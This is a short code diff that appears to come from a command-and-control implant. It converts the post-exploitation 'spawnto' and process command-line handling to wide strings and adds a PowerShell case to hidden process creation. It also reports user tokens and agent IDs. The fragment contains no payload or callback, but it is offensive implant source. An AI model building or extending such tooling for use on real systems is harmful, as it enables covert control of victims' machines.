@@ -617,7 +617,7 @@ auto DECLFN Task::Info(
 
     // postex
     Self->Pkg->Str( Package, Self->Config.Postex.ForkPipe );
-    Self->Pkg->Str( Package, Self->Config.Postex.Spawnto );
+    Self->Pkg->Wstr( Package, Self->Config.Postex.Spawnto );
 
     // session
     Self->Pkg->Str( Package, Self->Session.AgentID );
@@ -1262,7 +1262,7 @@ auto DECLFN Task::Config(
                 break;
             }
             case Enm::Config::Spawn: {
-                CHAR* Spawnto = Self->Psr->Str( Parser, 0 );
+                WCHAR* Spawnto = Self->Psr->Wstr( Parser, 0 );
                 
                 Self->Config.Postex.Spawnto = Spawnto;
 
@@ -2549,13 +2549,15 @@ auto DECLFN Task::Process(
     Self->Pkg->Byte( Package, SbCommandID );
 
     switch ( SbCommandID ) {
+        case Enm::Ps::Pwsh: 
         case Enm::Ps::Create: {
             G_PACKAGE = Package;
 
-            CHAR*               CommandLine = Self->Psr->Str( Parser, &TmpVal );
+            WCHAR*              CommandLine = Self->Psr->Wstr( Parser, &TmpVal );
             PROCESS_INFORMATION PsInfo      = { 0 };
 
             KhDbg("start to run: %s", CommandLine);
+            KhDbg("start to run: %S", CommandLine);
 
             Success = Self->Ps->Create( CommandLine, TRUE, CREATE_NO_WINDOW, &PsInfo );
             if ( !Success ) return KhGetError;
@@ -2654,7 +2656,7 @@ auto DECLFN Task::Process(
                 
                 UserToken = Self->Tkn->GetUser( TokenHandle );            
                                 
-                if ( !UserToken ) {
+                if ( ! UserToken ) {
                     Self->Pkg->Str( Package, "-" );
                 } else {
                     Self->Pkg->Str( Package, UserToken );
